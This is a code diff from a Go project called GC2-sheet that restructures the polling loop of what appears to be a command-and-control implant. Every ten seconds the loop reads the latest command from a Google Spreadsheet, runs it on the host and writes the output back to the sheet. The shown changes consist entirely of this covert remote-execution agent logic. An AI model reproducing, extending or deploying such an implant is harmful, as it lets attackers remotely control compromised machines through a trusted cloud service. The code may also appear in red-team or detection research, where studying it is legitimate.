@@ -4,7 +4,6 @@ import (
 	"GC2-sheet/internal/authentication"
 	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
-	"sync"
 	"time"
 )
 
@@ -48,20 +47,35 @@ func Run (){
 	// Creating ticker
 	ticker := time.NewTicker(10 * time.Second)
 
-	// Creating infinite Waitgroup
-	var wg sync.WaitGroup
-	wg.Add(1)
+	for{
+		select {
+			case <- ticker.C:
+				go func() {
+					// Get last command in the pool
+					lastCommand := utils.GetLastCommand(spreadSheet)
 
-	go func() {
-		for{
-			select {
-				case <- ticker.C:
-					// Execute in a new thread to avoid deadlock
-					go execute(clientSheet, clientDrive, spreadSheet)
-			}
+					commandToExecute := ""
+					if lastCommand.Input == "" {
+						// Retrieve last command from the sheet
+						commandToExecute = readSheet(clientSheet, spreadSheet)
+					}
+					if commandToExecute == "" {
+						utils.LogDebug("No new command")
+						return
+					}
+
+					utils.LogDebug("New command: " + commandToExecute)
+
+					// Set new retrieved command
+					lastCommand.Input = commandToExecute
+
+					// Create new empty command before performing the current one (to avoid deadlock on command execution)
+					utils.CreateNewEmptyCommand(spreadSheet)
+
+					execute(spreadSheet, clientDrive, lastCommand, commandToExecute)
+					writeSheet(clientSheet, spreadSheet, lastCommand)
+				}()
 		}
-	}()
-
-	wg.Wait()
+	}
 
 }
